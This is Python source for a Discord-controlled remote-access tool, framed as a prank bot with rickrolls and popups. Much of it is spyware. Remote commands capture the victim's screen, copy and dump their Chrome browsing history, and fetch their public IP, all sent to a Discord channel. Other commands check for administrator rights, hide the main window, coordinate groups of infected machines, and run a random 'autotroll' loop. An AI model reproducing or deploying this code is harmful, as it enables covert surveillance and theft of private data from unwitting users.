import sys
import os
import ctypes
import platform
import time

risky = False

def isriskyboi():
    if platform.system() == "Windows":  #open using os' image opening application
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False
    else:
        return os.geteuid() == 0

if isriskyboi(): #Check riskyness
    risky = True
else:   
    risky = False
        
print(f"{risky}")

import subprocess
import time
import webbrowser
import discord
from discord.ext import commands 
import pyautogui
import platform
import tkinter as tk
from tkinter import messagebox, Toplevel
import pygetwindow as gw
from playsound3 import playsound
import sqlite3
import requests
import shutil
import random
import asyncio
from PIL import Image, ImageTk
import threading

#Token and channel id
Token = "" #Bot token goes here
chnid = 0 #Insert channel id

#Variables and stuff
strid = ""

script_dir = os.path.dirname(os.path.abspath(__file__))

scrnm = 'Screenshot.png'

scrdir = os.path.join(script_dir, scrnm)

history_path = os.path.expanduser('~') + '/Library/Application Support/Google/Chrome/Default/History'

hisout = 'history.txt'

hos = "hiscopy"

hoscopy = os.path.join(script_dir, hos)

historyoutput = os.path.join(script_dir, hisout)

app_data = os.getenv('LOCALAPPDATA')

SPI_SETDESKWALLPAPER = 20
SPIF_UPDATEINIFILE = 0x01
SPIF_SENDCHANGE = 0x02

autovar = False

image_paths = []

groupr = []

debugvalue = False
# Global variable to store images
photo_images = {}

# List of image paths
image_paths = []

#Get identifcation for direct commands
try:
    user = os.getlogin()
except OSError:
    # Handle the case where os.getlogin() doesn't work
    user = os.environ.get('USERNAME') or os.environ.get('USER') or 'unknown'
strid = user

#Intents
intents = discord.Intents.all() #To lazy to do each one
bot = commands.Bot(command_prefix="!", intents = discord.Intents.all())

#All defined classes
class ImagePopup:
    def __init__(self, image_path):
        self.image_path = image_path
        
        self.root = Toplevel()
        self.root.title(image_path)
        self.root.overrideredirect(True)  # Create a borderless window
        self.root.attributes("-topmost", True)

        img = Image.open(self.image_path)

        screen_width = self.root.winfo_screenwidth()
        screen_height = self.root.winfo_screenheight()

        imgsource = max(img.width, img.height) / min(screen_width, screen_height)
        img_targetsize = random.uniform(30, 70)  # Use a float range for more variability
        resize_factor = img_targetsize / imgsource
        img = img.resize((int(img.width * resize_factor), int(img.height * resize_factor)))

        self.img_tk = ImageTk.PhotoImage(img)
        photo_images[self.image_path] = self.img_tk

        self.label = tk.Label(self.root, image=self.img_tk)
        self.label.pack()

        # Calculate window position
        window_width = img.width
        window_height = img.height

        randX = random.randint(0, screen_width - window_width)
        randY = random.randint(0, screen_height - window_height)

        # Set window position
        self.root.geometry(f'{window_width}x{window_height}+{randX}+{randY}')

        # Close window on click
        self.label.bind("<Button-1>", self.close)
        self.root.protocol("WM_DELETE_WINDOW", self.close)  # Handle close event

    def close(self, event=None):
        self.root.destroy()

#Command functions
def writefunct(text):
    if text != None:
            print(text)    
    else:
        text = "Crazy? I was crazy once. They put me in a room. A rubber room. A rubber room with rats. They put me in a rubber room with rubber rats. Rubber rats? I hate rubber rats. They make me crazy."  #Replace with desired text,
    
    if platform.system() == "Windows":  #open using os' image opening application
        subprocess.Popen("C:\\Windows\\System32\\notepad.exe")
        time.sleep(2)
        windows = gw.getWindowsWithTitle("Untitled - Notepad")
        if windows:
            notepad = windows[0]
            notepad.activate()  # Bring Notepad to the foreground
            pyautogui.write(f"{text}", interval=0.05)  #pyauotgui kinda sucks so if text gets skiped im not fixing it
            return
        else:
            returnvar = 2
            return returnvar

    elif platform.system() == "Darwin": #Apple/Mac support added when in can test
        print(0)
        return

    else: #linux the best one that I can't test
        print(0)
        return

    
def urlfunct(url): #self explanitory
    webbrowser.open(url)


def promptfunct(name, text):
    if text == None:
        text = "Regularly scheduled Jumpscare"

    if name == strid:
        messagebox.showinfo("Special Important message", f"{text}")

    else:
        messagebox.showinfo("Important message", f"{text}")


def wallfunct(imagepth):          #make function work on all os later
    if not os.path.isfile(imagepth):
        print(f"File not found: {imagepth}")
        return
    
    absimagepath = os.path.abspath(imagepth)
    print(absimagepath)
    if risky == True:
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, absimagepath, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE)
        imvar = f"Wallpaper changed: {strid}, Permenant"                           
    else:
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, absimagepath, SPIF_SENDCHANGE)
        imvar = f"Wallpaper changed: {strid}"
    return imvar
    

def historyfunct():
    if app_data:
    #Construct the path to the Chrome history file
        history_path = os.path.join(app_data, 'Google', 'Chrome', 'User Data', 'Default', 'History')

    if not os.path.exists(historyoutput):
        with open(historyoutput, 'w') as file:
            file.write("History\n")

    #Connect to the database
    shutil.copy(history_path, hoscopy)
    
    conn = sqlite3.connect(hoscopy)
    cursor = conn.cursor()

    #Query to get the browsing history
    query = "SELECT url, title, visit_count FROM urls ORDER BY last_visit_time DESC LIMIT 50"
    cursor.execute(query)

    #Fetch and format the results
    results = cursor.fetchall()

    with open(historyoutput, 'w', encoding='utf-8') as file:
        file.write(f"--- History Dump at {time.strftime('%Y-%m-%d %H:%M:%S')} ---\n")
        for row in results:
            file.write(f"URL: {row[0]}\nTitle: {row[1]}\nLast Visit Time: {row[2]}\n\n")
        file.write("\n")
    conn.close()
    os.remove(hoscopy)

    
def openimgfunc(file_path):
    if os.path.exists(file_path):
        print(f'File exists: {file_path}')
    else:
        print(f'File does not exist: {file_path}')

    if platform.system() == "Windows":  #open using os' image opening application
        os.startfile(file_path)
    elif platform.system() == "Darwin":
        subprocess.call(["open", file_path])
    else:
        subprocess.call(["xdg-open", file_path])


def delimgfunc(file_path):
    time.sleep(10)      #wait before delete so image can load even if device is slow

    #Delete the file
    os.remove(file_path)

    time.sleep(5)

    if os.path.exists(file_path): #debug: wait and check if like image is deleted
        print(f'File exists: {file_path}')
    else:
        print(f'File does not exist: {file_path}')


def popimgthreadfunct(image_path):
    # Create a new thread for each image
    thread = threading.Thread(target=lambda: ImagePopup(image_path))
    thread.start()

#Bot Events
@bot.event #When bot connects to server
async def on_ready():
    print("Running")                                    #Debug
    channel = bot.get_channel(chnid)                    #Get the specifed channel
    await channel.send(f"Operating: {strid}, Admin: {risky}")           #Send message to server
    promptfunct("all", "Sdotpy Running")


#Bot commands.  Example: !test all
@bot.command(name='stop')#To close specified online bots
async def stop(ctx, *, name: str = None):
    if name == strid or name == "all" or name in groupr:   #Send command to only directed bot
        await ctx.send(f"Shuting down: {strid}")
        root = tk.Tk()
        root.quit()
        sys.exit()


@bot.command(name='test')#Test if bot can receive
async def test(ctx, *, name: str = None):
    if name == strid:                           #Sends message "directed test" with id to verify direct receive function works
        await ctx.send(f'Directed test: {strid}, Ver 3.2, Admin: {risky}, Debug: {debugvalue}')
    elif name == "all":                         #Sends message "all test" with id to verify receive all function works
        await ctx.send(f'All test: {strid}, Ver 3.2, Admin: {risky}, Debug: {debugvalue}')
    elif name in groupr:
        await ctx.send(f'Group test: {strid}, Ver 3.2, Admin: {risky}, Debug: {debugvalue}')
    else:                                       #Does nothing because target destination is mispelled or not the directed bot
        print("0")


@bot.command(name='debug')#Enables/disables sends debug messages to confirm the command was processed
async def debug(ctx, name: str = None, *, debugrep: str = 'O'):
    global debugvalue
    if name == strid or name == "all" or name in groupr:
        if debugrep.lower() in 'true':           
            debugvalue = True
            await ctx.send(f'Debuging set to {debugvalue}: {strid}')
        elif debugrep.lower() in 'false':
            debugvalue = False
            await ctx.send(f'Debuging set to {debugvalue}: {strid}')
        else:
            debugvalue = not debugvalue
            await ctx.send(f'Debuging set to {debugvalue}: {strid}')


@bot.command(name='group')#Grouping function usefull for multiple people/groups
async def group(ctx, name: str = None, *, groupnm: str = None):
    global groupr
    if name == strid or name == "all" or name in groupr:
        if groupnm != None:
            if groupnm not in groupr:         
                groupr.append(groupnm)
                if debugvalue == True:
                    await ctx.send(f'Added {strid} to: {groupnm}')
            else:
                groupr.remove(groupnm)
                if debugvalue == True:
                    await ctx.send(f'Removed {strid} from: {groupnm}')
        else:
            await ctx.send(f'Specify a group name')
    else:
        print(0)

@bot.command(name='listgroup')#Grouping function usefull for multiple people/groups
async def listgroup(ctx, name: str = None, *, groupnm: str = None):
    global groupr
    if name == strid or name == "all" or name in groupr:
        grplst = ', '.join(groupr)
        await ctx.send(f'List groups {strid}: {grplst}')
        

@bot.command(name='screen')
async def screen(ctx, *, name: str = None):
    if name == strid or name == "all" or name in groupr:                  #Send to only specified id
        pyautogui.screenshot(scrdir) #take screenshot
        await ctx.send(content=f"Screen:{strid}", file=discord.File(scrdir)) #send screenshot
        try:
            # Delete the file
            os.remove(scrdir)
        except Exception as e:
                print("ohno") 


@bot.command(name='write')#Check function for details
async def write(ctx, name: str = None, *, text: str = None):
    if name == strid or name == "all" or name in groupr:
        returnvar = writefunct(text)
        if returnvar == 2:
            await ctx.send("Error")
        else:
            if debugvalue == True:
                await ctx.send(f"Write:{strid}")


@bot.command(name='rick')#Check function for details
async def rick(ctx, *, name: str = None):
    if name == strid or name == "all" or name in groupr:
        url = 'https://www.youtube.com/watch?v=p7YXXieghto'
        urlfunct(url)
        if debugvalue == True:
            await ctx.send(f'Rickrolled: {strid}')


@bot.command(name='altrick')#Check function for details
async def altrick(ctx, *, name: str = None):
    if name == strid or name == "all" or name in groupr:
        url = 'https://youtube.com/clip/Ugkx6oaIXZKt-QhGWyxiwjIUQdK--u3zN-JE?si=FGFWE2OV0m9utxLc'
        urlfunct(url)
        if debugvalue == True:
            await ctx.send(f'Animated rickrolled: {strid}')


@bot.command(name='url')#Check function for details
async def url(ctx, name: str = None, *, text: str = None):
    if name == strid or name == "all" or name in groupr:
        url = f'{text}'
        urlfunct(url)
        if debugvalue == True:
            await ctx.send(f'Url opened: {strid}')


@bot.command(name='openimg')
async def openimg(ctx, *, name: str = None):
    if name == strid or name == "all" or name in groupr:
        if ctx.message.attachments:
            attachment = ctx.message.attachments[0]  # Get the first attachment
            file_name = attachment.filename  # Get the name of the file

            # Download the file
            try:
                file_path = os.path.join('.', file_name) 
                await attachment.save(file_path)
                # To optionally send the file back to the channel use this :await ctx.send(file=discord.File(file_path))
                openimgfunc(file_path)
                if debugvalue == True:
                    await ctx.send(f'Opened Img: {strid}')
                delimgfunc(file_path)

            except Exception as e:
                await ctx.send(f'Failed command: {e}')
        else:
            await ctx.send('No file attached')


@bot.command(name='prompt')#Check function for details
async def prompt(ctx, name: str = None, *, text: str = None):
    if name == strid or name == "all" or name in groupr:
        if debugvalue == True:
            await ctx.send(f"Prompt Sent:{strid}")
        promptfunct(name, text)
        if debugvalue == True:
            await ctx.send(f'Prompt Clicked: {strid}')


@bot.command(name='wallpaper')#Check function for details
async def wallpaper(ctx, *, name: str = None): 
    if name == strid or name == "all" or name in groupr:
        if ctx.message.attachments:
            attachment = ctx.message.attachments[0]  # Get the first attachment
            imgpth = attachment.filename  # Get the name of the file
            try:
                file_path = os.path.join('.', imgpth) 
                await attachment.save(file_path)
                print(file_path)
            except:
                await ctx.send(f'Failed to download the file')
            try:
                imvar = wallfunct(file_path)
                if debugvalue == True:
                    await ctx.send(imvar)
            except:
                await ctx.send(f'Failed to make wallpaper')     
        else:
            await ctx.send('No file atached')


@bot.command(name='audio')#Check function for details
async def audio(ctx, *, name: str = None):
    if name == strid or name == "all" or name in groupr:    
        if ctx.message.attachments:
            attachment = ctx.message.attachments[0]  # Get the first attachment
            audpth = attachment.filename  # Get the name of the file
            print(audpth)
            audie = os.path.join('.', audpth)
            await attachment.save(audie)
            print("Playing")
            if debugvalue == True:
                await ctx.send(f'Audio Playing: {strid}')
            await asyncio.playsound(audie)              #Make it so that the audio function doesn't block the main thread
            os.remove(audie)                            #That is if its broken never tested
        else:
            await ctx.send('No file atached')   


@bot.command(name='popimg')
async def popimg(ctx, *, name: str = None):
    if name == strid or name == "all" or name in groupr:
        if ctx.message.attachments:
            for attachment in ctx.message.attachments:
                file_path = os.path.join(script_dir, attachment.filename)
                await attachment.save(file_path)
                image_paths.append(file_path)
                print(file_path)
            if debugvalue == True:
                await ctx.send(f'Popping up: {strid}')
            for path in image_paths:
                popimgthreadfunct(path)
            await asyncio.sleep(10)
            for path in image_paths:
                os.remove(path)
            image_paths.clear()
        else:
            await ctx.send('Attach images')


@bot.command(name='history')
async def history(ctx, *, name: str = None):
    if name == strid or name == "all" or name in groupr:
        historyfunct()                           
        await ctx.send(content=f'💀History💀:{strid}', file=discord.File(historyoutput))
        os.remove(historyoutput)
        if risky == False:
            promptfunct(strid, "Search History Sent")


@bot.command(name='grabip')
async def grabip(ctx, *, name: str = None):
    if name == strid or name == "all" or name in groupr:     
        response = requests.get('https://api.ipify.org?format=json')
        publicip = response.json()['ip']
        await ctx.send(content=f'💀dirgrabip💀{name}:{publicip}')
        if risky == False: 
            promptfunct(strid, "Public IP Sent")

#CONSTANT WORK IN PROGRESS
functions = [lambda chnid, name="all": rick(chnid, name=name),
             lambda chnid, name="all": grabip(chnid, name=name),
             lambda chnid, name="all": history(chnid, name=name),
             lambda chnid, name="all": altrick(chnid, name=name),
             lambda chnid, name="all": screen(chnid, name=name)]            

@bot.command(name='autoswap')
async def autoswap(ctx, name: str = None, *, autov: str = "true"):
    global autovar
    if name == strid or name == "all" or name in groupr:
        if autov.lower() in 'true':           
            autovar = True
            await ctx.send(f'Auto set to {autovar}: {strid}')
        elif autov.lower() in 'false':
            autovar = False
            await ctx.send(f'Auto set to {autovar}: {strid}')
        else:
            autovar = not autovar
            await ctx.send(f'Auto set to {autovar}: {strid}')

@bot.command(name='autotroll')
async def autotroll(ctx, *, name: str = None):
    global autovar
    if autovar == True:
        if name == strid or name == "all" or name in groupr:
            await ctx.send('Autotroll Enabled')                       
            while autovar == True:  
                autof = random.choice(functions)
                print(autof)
                await autof(ctx)
                await asyncio.sleep(150)
    else:
        await ctx.send('Use autoswap and enter "true"')


@bot.command(name='extra')
async def extra(ctx, *, name: str = None):
    if name == strid or name == "all" or name in groupr:
        print("0")


# Function to run the bot
def run_bot():
    bot.run(Token)  # Replace with your bot token

# Start the bot in a separate thread
def start_bot_thread():
    bot_thread = threading.Thread(target=run_bot)
    bot_thread.start()

# Main function
def main():
    start_bot_thread()  # Start the Discord bot thread

    # Run Tkinter main loop in the main thread
    root = tk.Tk()
    root.withdraw()  # Hide the main window
    root.mainloop()

if __name__ == '__main__':
    main()
